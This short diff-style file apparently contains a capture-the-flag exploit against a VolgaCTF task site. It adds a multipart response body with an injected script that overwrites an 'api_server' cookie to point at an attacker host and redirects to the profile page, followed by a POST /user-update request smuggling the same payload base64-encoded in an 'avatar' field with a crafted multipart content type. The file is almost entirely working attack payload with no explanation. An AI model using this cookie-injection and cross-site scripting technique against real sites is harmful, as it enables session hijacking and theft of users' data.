@@ -1,0 +1,11 @@
+x
+Content-Type:text/html
+
+<script>  document.cookie="api_server=attacker.tldýattackýý; path=/profile.html; domain=.volgactf-task.ru"; location="https://volgactf-task.ru/profile.html"</script>
+x--
+
+
+
+POST /user-update HTTP/1.1
+
+{"avatar":"eA0KQ29udGVudC1UeXBlOnRleHQvaHRtbA0KDQo8c2NyaXB0PiAgZG9jdW1lbnQuY29va2llPSJhcGlfc2VydmVyPWF0dGFja2VyLnRsZP1hdHRhY2v9/TsgcGF0aD0vcHJvZmlsZS5odG1sOyBkb21haW49LnZvbGdhY3RmLXRhc2sucnUiOyBsb2NhdGlvbj0iaHR0cHM6Ly92b2xnYWN0Zi10YXNrLnJ1L3Byb2ZpbGUuaHRtbCI8L3NjcmlwdD4KeC0t","type":"multipart/x-mixed-replace;boundary=x","bio":""}
